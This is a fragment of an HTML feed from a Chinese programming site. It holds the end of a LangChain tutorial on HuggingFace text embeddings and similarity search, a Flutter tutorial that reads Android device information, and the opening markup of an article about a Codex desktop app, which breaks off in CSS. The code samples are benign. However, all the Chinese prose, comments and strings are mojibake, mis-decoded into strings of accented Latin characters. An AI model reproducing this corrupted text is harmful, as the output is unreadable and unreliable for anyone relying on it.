                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"'<span class="hljs-subst">{text1}</span>' ä¸ '<span class="hljs-subst">{text2}</span>' çš„ç›¸ä¼¼åº¦: <span class="hljs-subst">{similarity:<span class="hljs-number">.4</span>f}</span>"</span>)

<span class="hljs-comment"># ç¤ºä¾‹ 2: æ–‡æœ¬æœç´¢åŠŸèƒ½</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">text_search_demo</span>():
    <span class="hljs-string">"""ä½¿ç”¨åµŒå…¥å®ç°ç®€å•çš„æ–‡æœ¬æœç´¢åŠŸèƒ½"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== æ–‡æœ¬æœç´¢åŠŸèƒ½æ¼”ç¤º ==="</span>)
    
    <span class="hljs-comment"># åˆ›å»ºåµŒå…¥æ¨¡å‹å®ä¾‹</span>
    embeddings = HuggingFaceEmbeddings(model_name=<span class="hljs-string">"all-MiniLM-L6-v2"</span>)
    
    <span class="hljs-comment"># æ–‡æ¡£é›†åˆ</span>
    documents = [
        <span class="hljs-string">"Python æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„é«˜çº§ç¼–ç¨‹è¯­è¨€"</span>,
        <span class="hljs-string">"LangChain æ˜¯ä¸€ä¸ªç”¨äºæ„å»º LLM åº”ç”¨çš„æ¡†æ¶"</span>,
        <span class="hljs-string">"æœºå™¨å­¦ä¹ æ˜¯äººå·¥æ™ºèƒ½çš„ä¸€ä¸ªåˆ†æ”¯"</span>,
        <span class="hljs-string">"æ·±åº¦å­¦ä¹ æ˜¯æœºå™¨å­¦ä¹ çš„ä¸€ä¸ªå­é¢†åŸŸ"</span>,
        <span class="hljs-string">"æ•°æ®ç§‘å­¦æ¶‰åŠæ•°æ®çš„åˆ†æå’Œå¯è§†åŒ–"</span>
    ]
    
    <span class="hljs-comment"># ç”Ÿæˆæ–‡æ¡£åµŒå…¥</span>
    doc_vectors = embeddings.embed_documents(documents)
    
    <span class="hljs-comment"># ç”¨æˆ·æŸ¥è¯¢</span>
    query = <span class="hljs-string">"ä»€ä¹ˆæ˜¯ LangChainï¼Ÿ"</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næŸ¥è¯¢: <span class="hljs-subst">{query}</span>"</span>)
    
    <span class="hljs-comment"># ç”ŸæˆæŸ¥è¯¢åµŒå…¥</span>
    query_vector = embeddings.embed_query(query)
    
    <span class="hljs-comment"># è®¡ç®—æŸ¥è¯¢ä¸æ¯ä¸ªæ–‡æ¡£çš„ç›¸ä¼¼åº¦</span>
    similarities = cosine_similarity([query_vector], doc_vectors)[<span class="hljs-number">0</span>]
    
    <span class="hljs-comment"># æŒ‰ç›¸ä¼¼åº¦æ’åº</span>
    sorted_indices = np.argsort(similarities)[::-<span class="hljs-number">1</span>]
    
    <span class="hljs-comment"># æ˜¾ç¤ºæœç´¢ç»“æœ</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næœç´¢ç»“æœï¼ˆæŒ‰ç›¸ä¼¼åº¦æ’åºï¼‰:"</span>)
    <span class="hljs-keyword">for</span> i, idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sorted_indices):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>. ç›¸ä¼¼åº¦: <span class="hljs-subst">{similarities[idx]:<span class="hljs-number">.4</span>f}</span> - <span class="hljs-subst">{documents[idx]}</span>"</span>)



<span class="hljs-comment"># è¿è¡Œç¤ºä¾‹</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"LangChain åµŒå…¥ç¤ºä¾‹"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">50</span>)
    
    <span class="hljs-comment"># è¿è¡Œ HuggingFace åµŒå…¥ç¤ºä¾‹</span>
    use_huggingface_embeddings()
    
    <span class="hljs-comment"># è¿è¡Œæ–‡æœ¬æœç´¢ç¤ºä¾‹</span>
    text_search_demo()

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\nç¤ºä¾‹è¿è¡Œå®Œæˆï¼"</span>)

</code></pre>
<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac7b8fbb30f64b6dbbf92ab7b2f3dd2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770773478&amp;x-signature=jXm1QSN1g54S1Fb8Wlt812nZpEM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">HuggingFaceEmbeddings ç±»</h3>
<p>æ¥æºï¼šlangchain-huggingface åŒ…ä¸­çš„ç±»</p>
<p>åŠŸèƒ½ï¼šå°è£…äº† HuggingFace çš„é¢„è®­ç»ƒåµŒå…¥æ¨¡å‹ï¼Œæä¾›ç»Ÿä¸€çš„æ¥å£ç”¨äºæ–‡æœ¬å‘é‡åŒ–</p>
<p>ä¸»è¦æ–¹æ³•ï¼š</p>
<ul>
<li>embed_documents(texts)ï¼šæ‰¹é‡ä¸ºå¤šä¸ªæ–‡æœ¬ç”ŸæˆåµŒå…¥å‘é‡</li>
<li>embed_query(text)ï¼šä¸ºå•ä¸ªæŸ¥è¯¢æ–‡æœ¬ç”ŸæˆåµŒå…¥å‘é‡</li>
</ul>
<h3 data-id="heading-5">all-MiniLM-L6-v2 æ¨¡å‹</h3>
<p>è½»é‡çº§ï¼š</p>
<ul>
<li>åŸºäº MiniLM æ¶æ„ï¼ˆBERT çš„è½»é‡çº§ç‰ˆæœ¬ï¼‰</li>
<li>æ¨¡å‹å¤§å°çº¦ 80MBï¼Œé€‚åˆåœ¨èµ„æºå—é™ç¯å¢ƒä¸­ä½¿ç”¨</li>
</ul>
<p>å¤šè¯­è¨€æ”¯æŒï¼š</p>
<ul>
<li>æ”¯æŒå¤šç§è¯­è¨€çš„æ–‡æœ¬åµŒå…¥</li>
</ul>
<p>æ€§èƒ½å¹³è¡¡ï¼š</p>
<ul>
<li>åœ¨é€Ÿåº¦å’ŒåµŒå…¥è´¨é‡ä¹‹é—´å–å¾—äº†è‰¯å¥½å¹³è¡¡</li>
<li>è™½ç„¶æ¯”å¤§å‹æ¨¡å‹ï¼ˆå¦‚ BERT-baseï¼‰å°ï¼Œä½†åœ¨å¤§å¤šæ•°ä»»åŠ¡ä¸Šè¡¨ç°æ¥è¿‘</li>
</ul>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>æ–‡æœ¬ç›¸ä¼¼åº¦è®¡ç®—</li>
<li>è¯­ä¹‰æœç´¢</li>
<li>æ–‡æœ¬åˆ†ç±»</li>
<li>èšç±»åˆ†æ</li>
</ul>
<h2 data-id="heading-6">ç›¸å…³ä¾èµ–å®‰è£…</h2>
<pre><code class="hljs language-bash" lang="bash">pip install langchain-huggingface sentence-transformers scikit-learn numpy
</code></pre>
<h2 data-id="heading-7">å°ç»“</h2>
<p>ç°åœ¨å¯¹äºåµŒå…¥æ¦‚å¿µæœ‰äº†å¤§æ¦‚çš„äº†è§£ï¼Œé‡Œé¢çš„ä¸€äº›ä»£ç æŠ€æœ¯ç»†èŠ‚æ˜¯è¶Šçœ‹è¶Šæ™•ï¼Œå¤šçœ‹å¤šç†è§£å§ï¼Œä»£ç å¤šè¿è¡Œçœ‹çœ‹ï¼Œç°åœ¨åªæ˜¯ç®€å•çš„è·‘é€šäº†ä¾‹å­ï¼Œé‡Œé¢å¤§æ¦‚ç”¨äº†ä»€ä¹ˆåº“ï¼Œå¤§æ¦‚ä»£ç æ˜¯æ€ä¹ˆå›äº‹ï¼Œåé¢å®æˆ˜é¡¹ç›®é‡åˆ°é—®é¢˜å†é’ˆå¯¹æ€§ç ”ç©¶å§</p>
<p>å½“ç„¶ï¼Œä¹Ÿå¯èƒ½åé¢å®æˆ˜é¡¹ç›®ä¸€è¡Œä»£ç ä¸å†™ï¼Œçº¯é¢å‘AIå˜´éå¼å¼€å‘</p>
<p>å·¥ä½œæ¯”è¾ƒå¿™ï¼Œæ–­æ–­ç»­ç»­å­¦ä¹ ç ”ç©¶ï¼Œæ”¶è·ä¸å¤§å¤šå°‘æœ‰ç‚¹ï¼Œæ…¢æ…¢æ¥ï¼ŒåŠ æ²¹ï¼</p>
<blockquote>
<p>æ¬¢è¿ç•™è¨€äº¤æµï¼Œå¦‚æœè§‰å¾—æœ‰å¸®åŠ©ï¼Œå¯ä»¥<code>ç‚¹ä¸ªèµ</code>æ”¯æŒä¸€ä¸‹</p>
<p>å…¬ä¼—å·ï¼šè‰å¸½lufei</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­¦ä¹ flutter 4.ä½¿ç”¨åŸç”Ÿèƒ½åŠ›]]></title>    <link>https://juejin.cn/post/7602454700504662057</link>    <guid>https://juejin.cn/post/7602454700504662057</guid>    <pubDate>2026-02-04T02:44:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700504662057" data-draft-id="7602488966610223142" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­¦ä¹ flutter 4.ä½¿ç”¨åŸç”Ÿèƒ½åŠ›"/> <meta itemprop="keywords" content="Flutter"/> <meta itemprop="datePublished" content="2026-02-04T02:44:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FanetheDivine"/> <meta itemprop="url" content="https://juejin.cn/user/4246761716322491"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­¦ä¹ flutter 4.ä½¿ç”¨åŸç”Ÿèƒ½åŠ›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4246761716322491/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FanetheDivine
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:44:55.000Z" title="Wed Feb 04 2026 02:44:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">è°ƒè¯•åº”ç”¨</h2>
<p>ä»¥å®‰å“ä¸ºä¾‹</p>
<p>è°ƒç”¨<code>flutter doctor</code> ç¡®ä¿Android toolchainå’ŒAndroid Studioéƒ½æ­£å¸¸</p>
<p>æ‰“å¼€Android Studio ç‚¹<code>More Actions</code>-&gt;<code>Virtual Device Manager</code> é€‰æœºå‹ã€ä¸‹è½½sdk</p>
<p>åœ¨vscodeæŒ‰ä¸‹ctrl+shift+P æ‰§è¡Œ<code>Flutter:Select Devices</code>å‘½ä»¤ é€‰ä¸­æ¨¡æ‹Ÿå™¨</p>
<p>è¿è¡Œflutterç¨‹åº</p>
<p>é¦–æ¬¡æ‰§è¡Œå¯èƒ½è¾ƒæ…¢ flutterä¼šä¸‹è½½ä¸€äº›ä¾èµ–</p>
<p>å¦å¤– è¿™ä¸ªè¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°æ–‡ä»¶å ç”¨ã€ä¾èµ–ç¼ºå¤±çš„é—®é¢˜ å±äºç¯å¢ƒé—®é¢˜ éœ€è¦é…åˆaiæ…¢æ…¢è°ƒ</p>
<p>Android Studioåœ¨è¿™é‡Œç®¡ç†sdk<br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37402c138e80438e90c5ac2cdefd5499~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770777894&amp;x-signature=kzay7m7BbhFzFKupECXBRtzYJB0%3D" alt="å±å¹•æˆªå›¾ 2026-02-04 090438.png" loading="lazy"/></p>
<p>æ³¨æ„æŠŠå³ä¸‹è§’show package details å‹¾é€‰ä¸Š ä¸ç„¶æ²¡æ³•ä¸‹è½½æŒ‡å®šç‰ˆæœ¬</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79894b30ce4747199e22e33dc520860a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770777894&amp;x-signature=CoSzIGaBURnOx0oT5SOslv8yffQ%3D" alt="å±å¹•æˆªå›¾ 2026-02-04 090450.png" loading="lazy"/></p>
<h3 data-id="heading-1">çœŸæœºè°ƒè¯•</h3>
<p>è¿›å…¥æ‰‹æœºçš„å¼€å‘è€…æ¨¡å¼ ä¸åŒå‚å•†å¯èƒ½æœ‰æ‰€ä¸åŒ</p>
<p>è¿æ¥ç”µè„‘ é€‰ä¸­æ‰‹æœºè®¾å¤‡ è¿è¡Œç¨‹åºå³å¯</p>
<h2 data-id="heading-2">flutterå¦‚ä½•ä½¿ç”¨åŸç”Ÿèƒ½åŠ›</h2>
<p>flutterä¸åŸç”Ÿç¨‹åºæ˜¯ä¸¤ä¸ªçº¿ç¨‹ ä»–ä»¬ä¹‹é—´é€šè¿‡<strong>æ¶ˆæ¯ç®¡é“</strong>è¿æ¥<br/>
è¿™ä¸ªè¿‡ç¨‹æ˜¯å¼‚æ­¥<strong>ä¸é˜»å¡</strong>çš„</p>
<p>flutterç¤¾åŒºå°è£…äº†å¤§é‡çš„åŸç”Ÿèƒ½åŠ›æ’ä»¶ åªéœ€è¦å¼•å…¥ç›¸åº”çš„åŒ…å°±å¯ä»¥ä½¿ç”¨</p>
<h2 data-id="heading-3">ä»£ç ç¤ºä¾‹</h2>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:device_info_plus/device_info_plus.dart'</span>;

<span class="hljs-keyword">final</span> deviceInfo = DeviceInfoPlugin();

Future&lt;<span class="hljs-built_in">String</span>&gt; getDeviceInfo() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">if</span> (Platform.isAndroid) {
  <span class="hljs-comment">// åƒæ­£å¸¸çš„å¼‚æ­¥å‡½æ•°ä¸€æ · ä½¿ç”¨åŸç”Ÿèƒ½åŠ›</span>
  <span class="hljs-comment">// å†…éƒ¨ä½¿ç”¨æ¶ˆæ¯ç®¡é“ å‘èµ·å’Œç›‘å¬äº‹ä»¶</span>
    <span class="hljs-keyword">final</span> androidInfo = <span class="hljs-keyword">await</span> deviceInfo.androidInfo;
    <span class="hljs-keyword">return</span> <span class="hljs-string">'''
å“ç‰Œ: <span class="hljs-subst">${androidInfo.brand}</span>
å‹å·: <span class="hljs-subst">${androidInfo.model}</span>
è®¾å¤‡: <span class="hljs-subst">${androidInfo.device}</span>
Android ç‰ˆæœ¬: <span class="hljs-subst">${androidInfo.version.release}</span>
SDK: <span class="hljs-subst">${androidInfo.version.sdkInt}</span>
    '''</span>;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-string">'Not Android'</span>;
}

<span class="hljs-keyword">void</span> main() {
  runApp(<span class="hljs-keyword">const</span> MyApp());
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> MyApp({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-comment">// This widget is the root of your application.</span>
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> MaterialApp(
        title: <span class="hljs-string">'Flutter Demo'</span>,
        theme: ThemeData(
          colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
          useMaterial3: <span class="hljs-keyword">true</span>,
        ),
        home: <span class="hljs-keyword">const</span> Test());
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">const</span> Test({<span class="hljs-keyword">super</span>.key});
  <span class="hljs-meta">@override</span>
  State&lt;Test&gt; createState() =&gt; _TestState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_TestState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">Test</span>&gt; </span>{
  <span class="hljs-built_in">String</span> info = <span class="hljs-string">'no info'</span>;
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    getDeviceInfo().then((value) {
      setState(() {
        info = value;
      });
    });
  }

  <span class="hljs-meta">@override</span>
  Widget build(context) {
    <span class="hljs-keyword">return</span> Text(info);
  }
}

</code></pre>
<h2 data-id="heading-4">æœ€ç»ˆæ•ˆæœ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90a8eed4f3d546b9b5198bf0aadb1936~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770777894&amp;x-signature=hnTC3wWicJPFxUJiqbYLo85P4Oo%3D" alt="fe0295e67d22747d63daa6be2ee2f1fa.jpg" loading="lazy"/></p>
<p>åœ¨å…¶ä»–ç«¯å¯ä»¥æ­£ç¡®æ„ŸçŸ¥åˆ°éå®‰å“å¹³å°</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fc78e3d2b4248fd8b644316b1e06605~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770777894&amp;x-signature=1TXvy%2BrBUsoIOEVlbo%2BSsd1Oqdg%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Open AIæ¨å‡ºCodexæ¡Œé¢ç‰ˆï¼Œ4å¤§æ ¸å¿ƒèƒ½åŠ›ç»ˆäºè§£å†³ç¼–ç¨‹å°ç™½çš„ç—›ç‚¹äº†ï¼ï¼ï¼]]></title>    <link>https://juejin.cn/post/7602482736913580067</link>    <guid>https://juejin.cn/post/7602482736913580067</guid>    <pubDate>2026-02-04T01:52:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602482736913580067" data-draft-id="7602466689712619535" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Open AIæ¨å‡ºCodexæ¡Œé¢ç‰ˆï¼Œ4å¤§æ ¸å¿ƒèƒ½åŠ›ç»ˆäºè§£å†³ç¼–ç¨‹å°ç™½çš„ç—›ç‚¹äº†ï¼ï¼ï¼"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-02-04T01:52:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­ªæ–¯Wise"/> <meta itemprop="url" content="https://juejin.cn/user/3156074412913466"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Open AIæ¨å‡ºCodexæ¡Œé¢ç‰ˆï¼Œ4å¤§æ ¸å¿ƒèƒ½åŠ›ç»ˆäºè§£å†³ç¼–ç¨‹å°ç™½çš„ç—›ç‚¹äº†ï¼ï¼ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3156074412913466/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­ªæ–¯Wise
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T01:52:19.000Z" title="Wed Feb 04 2026 01:52:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body 